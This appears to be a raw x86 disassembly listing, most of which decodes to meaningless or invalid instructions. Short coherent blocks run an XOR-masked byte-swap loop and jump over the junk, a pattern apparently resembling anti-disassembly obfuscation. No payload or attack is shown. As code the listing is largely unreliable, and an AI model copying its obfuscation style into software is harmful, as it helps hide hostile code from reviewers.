  40844f:	or     BYTE PTR [ebp+0x75ca99b8],0x35
  408456:	je     0x408447
  408458:	ffree  st(3)
  40845a:	lds    edx,FWORD PTR [eax-0x71f03cc]
  408460:	xor    BYTE PTR [ecx],bh
  408462:	fstp   DWORD PTR [edi]
  408464:	mov    esp,0xa813351b
  408469:	push   ebx
  40846a:	xor    DWORD PTR [ebp+0x21df87fe],edx
  408470:	ja     0x4084e4
  408472:	and    esp,DWORD PTR [esp+ecx*8+0x236bb12b]
  408479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40847a:	and    eax,0xb1dad484
  40847f:	push   0x641585e8
  408484:	xchg   BYTE PTR [esi+edi*2-0x51],bl
  408488:	jecxz  0x408438
  40848a:	aam    0x3d
  40848c:	pop    ecx
  40848d:	js     0x4084c3
  40848f:	push   0x130c98d1
  408494:	daa    
  408495:	jae    0x408498
  408497:	xor    al,0x4f
  408499:	fcmovb st,st(6)
  40849b:	pop    edx
  40849c:	and    al,0x3f
  40849e:	xor    DWORD PTR [ecx+0x220f6364],edx
  4084a4:	dec    eax
  4084a5:	cmp    eax,0xefc4f3e8
  4084aa:	pop    es
  4084ab:	mov    eax,ds:0xbbb90823
  4084b0:	loope  0x4084a4
  4084b2:	jae    0x408463
  4084b4:	xchg   esp,eax
  4084b5:	jns    0x4084db
  4084b7:	call   DWORD PTR [edi-0x598a31cd]
  4084bd:	call   DWORD PTR [ebx+esi*2-0x7d53ee5e]
  4084c4:	std    
  4084c5:	and    dh,BYTE PTR [ecx+0x16]
  4084c8:	adc    cl,BYTE PTR [ebx]
  4084ca:	jae    0x408464
  4084cc:	xchg   ebp,eax
  4084cd:	or     eax,0xc8798bd1
  4084d2:	sbb    DWORD PTR [ecx+edx*4-0x6fc1fa48],esp
  4084d9:	sbb    ebx,ecx
  4084db:	repnz and bh,al
  4084de:	outs   dx,BYTE PTR ds:[esi]
  4084df:	imul   DWORD PTR [ebx+0x5b33adbb]
  4084e5:	adc    DWORD PTR [edi+0x79200049],edx
  4084eb:	ror    BYTE PTR [edi+0x5b],0xd1
  4084ef:	add    al,0xc4
  4084f1:	sub    DWORD PTR [ecx-0x22],esi
  4084f4:	fsubr  DWORD PTR [edi]
  4084f6:	jne    0x4084e2
  4084f8:	mov    edx,0x6c9fa76c
  4084fd:	jb     0x4084fa
  4084ff:	sub    eax,0x53c37715
  408504:	or     eax,DWORD PTR [ecx+0x4f3e6f13]
  40850a:	xor    DWORD PTR [edi-0x6],0xfffffff8
  40850e:	cmp    esp,DWORD PTR [edx-0x2a0a7e28]
  408514:	and    BYTE PTR [eax+0x13],bh
  408517:	test   BYTE PTR [edx+0x65102a9c],bl
  40851d:	pop    ebp
  40851e:	lods   eax,DWORD PTR ds:[esi]
  40851f:	out    0x9f,al
  408521:	sbb    eax,0x53e302f9
  408526:	cs out dx,al
  408528:	pop    ebx
  408529:	fsubr  QWORD PTR [eax-0x6e]
  40852c:	lods   eax,DWORD PTR ds:[esi]
  40852d:	xor    cl,BYTE PTR [ecx+ecx*2-0x36ee9dcd]
  408534:	lea    ebp,[eax+esi*4-0x31]
  408538:	dec    edx
  408539:	pusha  
  40853a:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40853c:	outs   dx,DWORD PTR ds:[esi]
  40853d:	jmp    0x1029:0xddb8b8cc
  408544:	or     BYTE PTR [esi+esi*2],al
  408547:	adc    DWORD PTR [ebx-0x74],0xfffffff3
  40854b:	int3   
  40854c:	repnz adc esi,edx
  40854f:	(bad)  
  408550:	sahf   
  408551:	push   ecx
  408552:	and    eax,0x9e5c76db
  408557:	lahf   
  408558:	dec    eax
  408559:	mov    ebp,0x95e0ffa7
  40855f:	jb     0x40854a
  408561:	or     eax,DWORD PTR [ecx+0x19]
  408564:	into   
  408565:	jae    0x40855b
  408567:	dec    ecx
  408568:	adc    eax,0x31c90c57
  40856d:	or     bh,al
  40856f:	push   cs
  408570:	sar    DWORD PTR ds:0x817a3111,0x8b
  408577:	mov    ah,0x8d
  408579:	icebp  
  40857a:	test   al,0xd6
  40857c:	push   eax
  40857d:	out    0xc9,eax
  40857f:	sub    eax,DWORD PTR [ecx-0x61]
  408582:	adc    DWORD PTR [edi+0x5f1e9f4c],0x870fda3b
  40858c:	or     BYTE PTR [eax],al
  40858e:	add    BYTE PTR [eax],al
  408590:	mov    edx,DWORD PTR [ebp-0x34]
  408593:	jmp    0x408770
  408598:	mov    edx,DWORD PTR [ebp-0x3c]
  40859b:	mov    edi,DWORD PTR [ebp-0x4]
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0xbe43353f
  4085c4:	mov    esi,0x7ed7e11d
  4085c9:	jle    0x408555
  4085cb:	jg     0x40864b
  4085cd:	jle    0x408556
  4085cf:	jb     0x408630
  4085d1:	dec    edx
  4085d2:	mov    dl,0x18
  4085d4:	jns    0x40861c
  4085d6:	cdq    
  4085d7:	pop    es
  4085d8:	(bad)  
  4085da:	push   0x4851c670
  4085df:	pop    ss
  4085e0:	adc    BYTE PTR [ebx],ah
  4085e2:	mov    BYTE PTR ds:0xa02717a2,cl
  4085e8:	std    
  4085e9:	hlt    
  4085ea:	call   0xf4fcc56a
  4085ef:	lods   al,BYTE PTR ds:[esi]
  4085f0:	les    eax,FWORD PTR [esi-0x423b5d3d]
  4085f6:	outs   dx,BYTE PTR ds:[esi]
  4085f7:	and    cl,ch
  4085f9:	stos   DWORD PTR es:[edi],eax
  4085fa:	mov    BYTE PTR [eax],dl
  4085fc:	jp     0x408639
  4085fe:	imul   ecx,DWORD PTR [ebp-0x66],0x44
  408602:	add    BYTE PTR [ebx+0x26b1e4e],bh
  408608:	pop    ss
  408609:	(bad)  
  40860a:	mov    al,ds:0xf23e51f1
  40860f:	ins    DWORD PTR es:[edi],dx
  408610:	fmul   DWORD PTR [ebx-0x510fd1b7]
  408616:	sbb    edx,esi
  408618:	add    ebx,0x350a648b
  40861e:	sahf   
  40861f:	adc    DWORD PTR [eax+edi*8+0x6c7b14ad],edi
  408626:	mov    bh,0x50
  408628:	div    ebp
  40862a:	addr16 cli 
  40862c:	sub    al,0xa8
  40862e:	pusha  
  40862f:	popa   
  408630:	or     DWORD PTR [ecx+0x36],esi
  408633:	jg     0x408690
  408635:	or     BYTE PTR [ebx+0x10],dh
  408638:	rol    al,cl
  40863a:	xchg   DWORD PTR [esi-0x51],esi
  40863d:	jae    0x408607
  40863f:	jg     0x4086c0
  408641:	popa   
  408642:	and    al,0x32
  408644:	xchg   ebp,eax
  408645:	cmp    BYTE PTR [ebp+0x77],dh
  408648:	add    eax,0x8191fd7a
  40864d:	mov    ah,0xf8
  40864f:	(bad)  
  408650:	cwde   
  408651:	pop    edi
  408652:	add    al,0x13
  408654:	push   0xfd76343e
  408659:	mov    eax,ds:0x386f43dd
  40865e:	icebp  
  40865f:	fs cwd 
  408662:	stos   DWORD PTR es:[edi],eax
  408663:	jle    0x40869d
  408665:	mov    ds:0x3abff186,al
  40866a:	sub    ecx,DWORD PTR [ecx]
  40866c:	dec    esi
  40866d:	and    BYTE PTR [esi+0x12],ch
  408670:	xor    eax,0x94f4b90c
  408675:	enter  0xa0c1,0x16
  408679:	test   al,0xc7
  40867b:	jp     0x408666
  40867d:	es lock es push esi
  408681:	dec    ebp
  408682:	pop    eax
  408683:	loopne 0x4086e6
  408685:	xchg   esp,eax
  408686:	mov    bl,0x75
  408688:	pop    ss
  408689:	lea    ebx,[esi+esi*4-0x411a4342]
  408690:	jno    0x4086f8
  408692:	add    DWORD PTR [edi+0x72],eax
  408695:	pop    edx
  408696:	in     al,0x8b
  408698:	lds    esp,FWORD PTR [esi-0x20]
  40869b:	(bad)  
  40869c:	adc    al,0xab
  40869e:	fwait
  40869f:	mov    ebp,DWORD PTR [esp+ebp*8]
  4086a2:	jle    0x4086a2
  4086a4:	mov    ah,0xfb
  4086a6:	adc    al,0xf1
  4086a8:	shl    BYTE PTR [edx+esi*2+0x35],1
  4086ac:	add    dh,BYTE PTR [esi-0x50]
  4086af:	pop    es
  4086b0:	sbb    ah,0x47
  4086b3:	out    dx,eax
  4086b4:	xor    DWORD PTR [ebp-0x575a8d1c],0xffffff9f
  4086bb:	jle    0x408683
  4086bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086be:	xor    DWORD PTR [ebx+0x120d3328],0x18
  4086c5:	test   DWORD PTR [edx+0x1274095e],0x8effb473
  4086cf:	sbb    DWORD PTR [edx+0x15],ecx
  4086d2:	outs   dx,DWORD PTR ds:[esi]
  4086d3:	test   BYTE PTR [ecx],bh
  4086d5:	iret   
  4086d6:	leave  
  4086d7:	push   0x894dfb06
  4086dc:	push   eax
  4086dd:	mov    ds:0xc1041ae7,al
  4086e2:	clc    
  4086e3:	mov    eax,ds:0x2e36c6c8
  4086e8:	imul   ebx,DWORD PTR [eax+esi*8+0x75],0x187deb3f
  4086f0:	bound  ebx,QWORD PTR [ebp+0x7a693f45]
  4086f6:	jecxz  0x408731
  4086f8:	add    DWORD PTR [edx+edi*8-0x28],ecx
  4086fc:	cs xchg ebx,eax
  4086fe:	xlat   BYTE PTR ds:[ebx]
  4086ff:	into   
  408700:	jl     0x40872e
  408702:	add    DWORD PTR [edx+ecx*1+0x39bc9a5d],esi
  408709:	loopne 0x408694
  40870b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40870d:	jge    0x408701
  40870f:	jg     0x4086a6
  408711:	out    0x81,eax
  408713:	and    DWORD PTR [esp+edx*2],esp
  408716:	pop    esi
  408717:	(bad)  
  408719:	xlat   BYTE PTR cs:[ebx]
  40871b:	(bad)  
  40871c:	sar    BYTE PTR [eax+0x9cb2ca4],1
  408722:	loopne 0x408755
  408724:	sub    DWORD PTR [esi-0x19],edx
  408727:	jbe    0x40877c
  408729:	jmp    0xd8af8e6
  40872e:	mov    dh,0xdf
  408730:	(bad)  
  408731:	fdivr  DWORD PTR [ebp+0x73]
  408734:	mov    al,ds:0xab618e7f
  408739:	call   DWORD PTR [edi-0x44]
  40873c:	ins    DWORD PTR es:[edi],dx
  40873d:	out    0xa3,eax
  40873f:	and    eax,0x4ef288ce
  408744:	mov    ebp,0x8bb35fca
  408749:	ret    0x9aec
  40874c:	loopne 0x40878d
  40874e:	jmp    0x40874b
  408750:	and    al,0xbc
  408752:	dec    eax
  408753:	mov    ebp,0x6e0b8969
  408758:	(bad)  
  40875a:	mov    cl,0xa8
  40875c:	(bad)  
  40875d:	push   eax
  40875e:	sub    dl,BYTE PTR [eax-0x25c44420]
  408764:	mov    edx,DWORD PTR [ebp-0x38]
  408767:	jbe    0x408770
  40876d:	mov    edx,DWORD PTR [ebp-0x3c]
  408770:	mov    edi,DWORD PTR [ebp-0x4]
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	or     esp,eax
  408849:	lahf   
  40884a:	cmp    eax,0x7e7ed57d
  40884f:	mov    bh,BYTE PTR [edi+0x7e]
  408852:	jle    0x408851
  408854:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  408856:	mov    ch,0x0
  408858:	outs   dx,DWORD PTR ds:[esi]
  408859:	jmp    0xf1e2:0xf8f9e5af
  408860:	pop    ebx
  408861:	popa   
  408862:	sbb    bh,0xc
  408865:	xor    esi,DWORD PTR [ebx-0x1d]
  408868:	add    ah,ch
  40886a:	imul   DWORD PTR [edx]
  40886c:	inc    esp
  40886d:	loop   0x40881d
  40886f:	push   edi
  408870:	push   0x59
  408872:	test   DWORD PTR [edx-0x6abcb4d9],ebx
  408878:	push   ebp
  408879:	mov    esp,0xb1cfb696
  40887e:	xchg   esi,eax
  40887f:	inc    ebx
  408880:	pop    ecx
  408881:	sahf   
  408882:	mov    ah,0x74
  408884:	jae    0x4088b4
  408886:	mov    ecx,0xec0b94de
  40888b:	js     0x4088e4
  40888d:	(bad)  
  40888e:	scas   al,BYTE PTR es:[edi]
  40888f:	inc    eax
  408890:	ret    
  408891:	jg     0x4088a0
  408893:	jg     0x40883d
  408895:	lock sbb edx,DWORD PTR [ebp-0x68]
  408899:	enter  0x21c3,0xea
  40889d:	dec    edi
  40889e:	inc    edx
  40889f:	sub    ah,dl
  4088a1:	or     esp,DWORD PTR [ecx+0x40]
  4088a4:	jle    0x408869
  4088a6:	pop    ebp
  4088a7:	jge    0x40883e
  4088a9:	mov    ecx,0xb4770cc3
  4088ae:	add    BYTE PTR [esi+eax*1+0x39],bh
  4088b2:	jo     0x40888f
  4088b4:	mov    ebx,0x4aebcb7c
  4088b9:	(bad)  [ebx]
  4088bb:	xor    al,0x67
  4088bd:	adc    al,0x47
  4088bf:	push   ss
  4088c0:	and    eax,0x6b35e29b
  4088c5:	rcr    edi,0x2a
  4088c8:	mov    ah,BYTE PTR [ecx]
  4088ca:	lahf   
  4088cb:	xor    BYTE PTR [edi+0x32],dh
  4088ce:	in     al,dx
  4088cf:	xor    esi,DWORD PTR [edx+0xc72279e]
  4088d5:	pop    edi
  4088d6:	xor    al,0x75
  4088d8:	pop    edi
  4088d9:	sbb    dl,BYTE PTR [edx+0x12]
  4088dc:	imul   ecx,DWORD PTR [edi],0xffffffd8
  4088df:	xchg   ebp,eax
  4088e0:	mov    edi,0xafa0841
  4088e5:	sahf   
  4088e6:	arpl   WORD PTR [eax+0x1eb74b3a],dx
  4088ec:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4088ee:	gs enter 0x5c36,0x4d
  4088f3:	jae    0x4088c8
  4088f5:	cmp    esi,esp
  4088f7:	jg     0x408915
  4088f9:	daa    
  4088fa:	and    al,0xc3
  4088fc:	and    dl,BYTE PTR [ecx-0x2d]
  4088ff:	mov    ah,0x7f
  408901:	xchg   dh,cl
  408903:	or     eax,0xdb4fb77c
  408908:	fisub  WORD PTR [ecx-0x67]
  40890b:	inc    ebp
  40890c:	fwait
  40890d:	add    al,0xa
  40890f:	push   edx
  408910:	mov    ds:0x11be48ce,al
  408915:	push   cs
  408916:	mov    gs,WORD PTR [esi+0xc]
  408919:	dec    edx
  40891a:	mov    ebp,0xd375ff2d
  40891f:	sub    DWORD PTR [ebx+0x1f],esp
  408922:	call   0xa9cc:0xdac4073e
  408929:	xor    cl,BYTE PTR [esi]
  40892b:	repnz fdivr DWORD PTR [ebx+0x27]
  40892f:	inc    esi
  408930:	adc    edi,DWORD PTR [ebx]
  408932:	jno    0x4089a1
  408934:	ss mov edx,0x80f046
  40893a:	fisubr WORD PTR [ebx+0x16]
  40893d:	sbb    esp,0x68
  408940:	sbb    DWORD PTR [ecx-0x1f8a77dc],ebp
  408946:	icebp  
  408947:	xor    BYTE PTR [edi+ebp*2-0x3e],0xe3
  40894c:	sub    BYTE PTR [ebp-0x62],cl
  40894f:	sbb    al,0xef
  408951:	lds    edx,FWORD PTR [edi+0x1816eb17]
  408957:	cs loopne 0x40894b
  40895a:	fst    QWORD PTR [ebp-0x18]
  40895d:	push   ds
  40895e:	call   0x5c864e3c
  408963:	bound  edi,QWORD PTR [edi+0x7c]
  408966:	mov    cs,WORD PTR [esi+0x4c]
  408969:	adc    al,bh
  40896b:	icebp  
  40896c:	mov    dl,0xb4
  40896e:	shr    BYTE PTR [ebp-0x3a],1
  408971:	xor    ebx,ecx
  408973:	aas    
  408974:	xor    DWORD PTR [ecx-0x79],ebp
  408977:	in     eax,dx
  408978:	xchg   BYTE PTR [ebx-0xf15ab18],cl
  40897e:	add    BYTE PTR [ebx+0xb],dl
  408981:	push   0xe2b61806
  408986:	bound  ebx,QWORD PTR [edi+0x7aeaa8ac]
  40898c:	stc    
  40898d:	add    DWORD PTR [ebx+0x11d218f9],ebx
  408993:	leave  
  408994:	cmp    DWORD PTR [ebx],0x2844833f
  40899a:	xchg   esp,eax
  40899b:	dec    esp
  40899c:	sbb    al,0xe1
  40899e:	aad    0xb5
  4089a0:	cwde   
  4089a1:	outs   dx,BYTE PTR ds:[esi]
  4089a2:	or     esi,esi
  4089a4:	and    al,BYTE PTR ds:0xc10a5162
  4089aa:	out    dx,al
  4089ab:	inc    edx
  4089ac:	mov    bh,0x3d
  4089af:	push   ebx
  4089b0:	mov    al,0xbf
  4089b2:	jno    0x408999
  4089b4:	lods   eax,DWORD PTR ds:[esi]
  4089b5:	jmp    0x14c40b1f
  4089ba:	mov    ebp,ss
  4089bc:	cmp    DWORD PTR [eax],ecx
  4089be:	ror    DWORD PTR [ebp+0x78ac63d3],1
  4089c4:	xlat   BYTE PTR ds:[ebx]
  4089c5:	adc    cl,ah
  4089c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089c8:	cli    
  4089c9:	lock lods al,BYTE PTR ds:[esi]
  4089cb:	mov    ecx,0x28c1fafa
  4089d0:	mov    ch,0x1
  4089d2:	sub    eax,0x614c7538
  4089d7:	pop    esp
  4089d8:	lods   al,BYTE PTR ds:[esi]
  4089d9:	dec    esi
  4089da:	pop    ecx
  4089db:	add    eax,0x5927a93e
  4089e0:	pop    ecx
  4089e1:	repz inc ebp
  4089e3:	in     al,dx
  4089e4:	mov    al,ds:0xf8336e7e
  4089e9:	add    edi,ecx
  4089eb:	imul   edi,ebx
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	scas   al,BYTE PTR es:[edi]
  408a07:	stc    
  408a08:	sar    DWORD PTR ds:0x7e7ed289,cl
  408a0e:	mov    bh,BYTE PTR [edi+0x7e]
  408a11:	jle    0x40899d
  408a13:	out    dx,eax
  408a14:	jae    0x408a13
  408a16:	lods   eax,DWORD PTR ds:[esi]
  408a17:	lods   eax,DWORD PTR ds:[esi]
  408a18:	aaa    
  408a19:	add    BYTE PTR [ebp-0x43],0x20
  408a1d:	pop    eax
  408a1e:	mov    esi,0xf95a638
  408a23:	inc    edx
  408a24:	sub    cl,BYTE PTR [ebp+0x21]
  408a27:	cli    
  408a28:	mov    edx,0xb67e2480
  408a2d:	inc    esp
  408a2e:	frstor [edx+0x45dba6c]
  408a34:	lods   al,BYTE PTR ds:[esi]
  408a35:	lods   al,BYTE PTR ds:[esi]
  408a36:	pop    ebp
  408a37:	dec    eax
  408a38:	jl     0x408a2c
  408a3a:	cmp    DWORD PTR [edi+0x7c],esi
  408a3d:	mov    esi,0xbd86bf9f
  408a42:	sbb    al,0x14
  408a44:	leave  
  408a45:	(bad)  
  408a46:	fs push ebx
  408a48:	xor    ch,cl
  408a4a:	and    al,BYTE PTR [ecx+edx*2]
  408a4d:	daa    
  408a4e:	add    bh,dl
  408a50:	or     ebx,DWORD PTR [esi*1-0x73e48595]
  408a57:	pop    eax
  408a58:	sbb    BYTE PTR ds:0x9531650c,ah
  408a5e:	sub    BYTE PTR [ebx+0x4b],0x38
  408a62:	enter  0x30a9,0xd7
  408a66:	push   ecx
  408a67:	out    0x40,eax
  408a69:	push   edx
  408a6a:	or     BYTE PTR [edx-0x1d6befb8],al
  408a70:	inc    esi
  408a71:	mov    ah,0x7e
  408a73:	leave  
  408a74:	shl    DWORD PTR [ecx],1
  408a76:	adc    al,ah
  408a78:	inc    edx
  408a79:	in     eax,dx
  408a7a:	mov    dh,0x6e
  408a7c:	outs   dx,DWORD PTR ds:[esi]
  408a7d:	inc    edi
  408a7e:	popa   
  408a7f:	pusha  
  408a80:	repnz (bad) 
  408a82:	lahf   
  408a83:	and    eax,0x4650105e
  408a88:	addr16 jmp 0x6c2e1f70
  408a8e:	pop    eax
  408a8f:	ret    0x6b70
  408a92:	cwde   
  408a93:	jle    0x408a70
  408a95:	pop    ecx
  408a96:	and    ch,BYTE PTR [edi+0x21ceac50]
  408a9c:	and    ebx,ebp
  408a9e:	inc    ecx
  408a9f:	fld    DWORD PTR [edi+0x26edadad]
  408aa5:	aaa    
  408aa6:	cmc    
  408aa7:	and    eax,0x71b109b4
  408aac:	cmp    al,0x3a
  408aae:	sbb    BYTE PTR [ecx],dh
  408ab0:	mov    BYTE PTR [ebp+0x3f684c52],bh
  408ab6:	leave  
  408ab7:	scas   eax,DWORD PTR es:[edi]
  408ab8:	jno    0x408aa0
  408aba:	bound  eax,QWORD PTR [esi-0x4ee8e72e]
  408ac0:	lods   eax,DWORD PTR ds:[esi]
  408ac1:	sub    BYTE PTR [eax+0x5f925b33],ch
  408ac7:	test   eax,0xc40688ef
  408acc:	ja     0x408a6c
  408ace:	retf   0x38dd
  408ad1:	ja     0x408ab0
  408ad3:	test   BYTE PTR [ecx+0x71cd2a4b],al
  408ad9:	or     eax,0xd5b491d7
  408ade:	lods   al,BYTE PTR ds:[esi]
  408adf:	mov    edx,0xe4b8a70d
  408ae4:	ds jbe 0x408aa7
  408ae7:	pushf  
  408ae8:	cmp    ecx,DWORD PTR [edi+0x20]
  408aeb:	das    
  408aec:	push   cs
  408aed:	and    eax,0xf29ca3ca
  408af2:	mov    esi,0x650d2649
  408af7:	(bad)  
  408af8:	mov    cl,0xbb
  408afa:	fucomip st,st(6)
  408afc:	mov    WORD PTR [eax+ecx*8],?
  408aff:	mov    ds:0x1a245342,al
  408b04:	shl    DWORD PTR [ebp-0x5c],cl
  408b07:	stos   DWORD PTR es:[edi],eax
  408b08:	sbb    al,al
  408b0a:	mov    DWORD PTR [edx+edx*2],eax
  408b0d:	mov    esi,0x44a4e511
  408b12:	lods   al,BYTE PTR ds:[esi]
  408b13:	sub    DWORD PTR [eax+edi*4+0x6f],0x748f56d5
  408b1b:	add    al,0xc4
  408b1e:	adc    BYTE PTR [edx-0x3fed9e18],cl
  408b24:	jge    0x408b49
  408b26:	lock add DWORD PTR [eax-0x13],0x70
  408b2b:	pushf  
  408b2c:	xchg   ebx,ecx
  408b2e:	jmp    DWORD PTR ds:0x2c45475c
  408b34:	sub    BYTE PTR [ecx+0x7b],ch
  408b37:	pop    esi
  408b38:	xor    ah,BYTE PTR [ecx]
  408b3a:	sub    DWORD PTR ds:0x87c78b66,edx
  408b40:	push   eax
  408b41:	inc    eax
  408b42:	push   ebp
  408b43:	and    bh,BYTE PTR [esi-0x6a6e49cc]
  408b49:	mov    ebx,0xad8284c7
  408b4e:	pop    esi
  408b4f:	dec    ebp
  408b50:	lahf   
  408b51:	push   ecx
  408b52:	call   0x2e43f31a
  408b57:	dec    ecx
  408b58:	into   
  408b59:	dec    edi
  408b5a:	xor    DWORD PTR [edi+0x4e],ecx
  408b5d:	cli    
  408b5e:	aaa    
  408b5f:	cs xor ah,ah
  408b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b63:	mov    ds:0x3e371e9,eax
  408b68:	icebp  
  408b69:	jp     0x408be7
  408b6b:	adc    ch,ch
  408b6d:	cmp    eax,DWORD PTR [esi-0x231e6ed1]
  408b73:	outs   dx,DWORD PTR ds:[esi]
  408b74:	jns    0x408bb6
  408b76:	jne    0x408b67
  408b78:	cmp    BYTE PTR [ecx+eiz*4-0x1d7a8c6f],bh
  408b7f:	addr16 (bad) 
  408b81:	fstp   st(5)
  408b83:	and    BYTE PTR fs:[edx+0x1f],bl
  408b87:	inc    eax
  408b88:	dec    ebp
  408b89:	sar    DWORD PTR [ebx-0x73],cl
  408b8c:	inc    ebx
  408b8d:	xor    al,0x8
  408b8f:	ja     0x408bd5
  408b91:	jl     0x408bb8
  408b93:	scas   eax,DWORD PTR es:[edi]
  408b94:	push   es
  408b95:	push   cs
  408b96:	and    DWORD PTR [bx+si-0x33],ecx
  408b9a:	(bad)  [esi+0x30de077]
  408ba0:	test   BYTE PTR [ebx-0x3d5ff1c1],dl
  408ba6:	lea    edi,[edi+ebx*1+0x32729b]
  408bad:	cmp    edi,edx
  408baf:	jbe    0x4087b1
  408bb5:	mov    edx,DWORD PTR [ebp-0xc]
  408bb8:	mov    edi,DWORD PTR [ebp-0x24]
  408bbb:	xor    edx,eax
  408bbd:	add    edx,ecx
  408bbf:	imul   edx,edi
  408bc2:	mov    edi,DWORD PTR [ebp-0x18]
  408bc5:	xor    edi,eax
  408bc7:	jmp    0x408d78
  408bcc:	and    eax,0x71ffb36e
  408bd1:	inc    ebx
  408bd2:	xor    DWORD PTR [edx+eiz*8-0xd],esi
  408bd6:	ret    
  408bd7:	das    
  408bd8:	iret   
  408bd9:	sub    ch,BYTE PTR [esi+0x7ed025ce]
  408bdf:	jle    0x408b6b
  408be1:	jg     0x408c61
  408be3:	jle    0x408c33
  408be5:	inc    edi
  408be6:	jle    0x408bda
  408be8:	xchg   BYTE PTR [ebx],cl
  408bea:	xor    al,0xa0
  408bec:	call   0xde73:0x5c74a908
  408bf3:	sub    al,0xd0
  408bf5:	call   0xc458d7e6
  408bfa:	fstp   DWORD PTR [esi+0x23c5960b]
  408c00:	in     al,0xec
  408c02:	and    al,0xa3
  408c04:	inc    esp
  408c05:	push   es
  408c06:	add    BYTE PTR [ebx+0x4ec206a],al
  408c0c:	push   edx
  408c0d:	sub    ebp,DWORD PTR [ebx+0x37]
  408c10:	jae    0x408c48
  408c12:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  408c14:	jno    0x408c41
  408c16:	and    BYTE PTR [esi],dh
  408c18:	stc    
  408c19:	xlat   BYTE PTR ds:[ebx]
  408c1a:	mov    eax,0x2e4be480
  408c1f:	pop    edx
  408c20:	pop    eax
  408c21:	out    0xcc,al
  408c23:	push   ebp
  408c24:	or     DWORD PTR [ebx],0xffffffb8
  408c27:	xchg   edi,eax
  408c28:	xlat   BYTE PTR ds:[ebx]
  408c29:	icebp  
  408c2a:	ret    
  408c2b:	mov    bh,0xbe
  408c2d:	pop    ss
  408c2e:	ins    BYTE PTR es:[edi],dx
  408c2f:	mov    DWORD PTR [ebx+edx*4-0xc],0x97c2abac
  408c37:	arpl   WORD PTR [ecx-0x1ec99c08],bx
  408c3d:	adc    DWORD PTR [ebx+0xd754f4c],ecx
  408c43:	js     0x408c50
  408c45:	xor    eax,0x3004bb02
  408c4a:	jae    0x408c46
  408c4c:	test   DWORD PTR [edx],eax
  408c4e:	adc    BYTE PTR [esp+edx*2],dl
  408c51:	cmc    
  408c52:	inc    eax
  408c53:	fistp  QWORD PTR [esi+eax*2+0x5a]
